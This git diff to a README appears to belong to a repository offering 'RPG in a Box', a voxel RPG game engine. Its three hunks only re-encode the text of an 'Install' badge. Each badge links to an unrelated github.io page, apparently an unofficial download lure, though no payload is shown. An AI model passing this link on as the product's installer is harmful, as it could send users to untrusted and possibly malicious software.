@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install RPG in a Box](https://img.shields.io/badge/⬇_Install_RPG%20in%20a%20Box-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install RPG in a Box](https://img.shields.io/badge/⬇_Install_RPG+in+a+Box-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ RPG in a Box is an indie game engine for creating voxel-art RPGs and adventure g
 
 <div align="center">
 
-[![⬇ Install RPG in a Box](https://img.shields.io/badge/⬇_Install_RPG%20in%20a%20Box-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install RPG in a Box](https://img.shields.io/badge/⬇_Install_RPG+in+a+Box-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ RPG in a Box is an indie game engine for creating voxel-art RPGs and adventure g
 
 <div align="center">
 
-[![⬇ Install RPG in a Box](https://img.shields.io/badge/⬇_Install_RPG%20in%20a%20Box-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install RPG in a Box](https://img.shields.io/badge/⬇_Install_RPG+in+a+Box-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
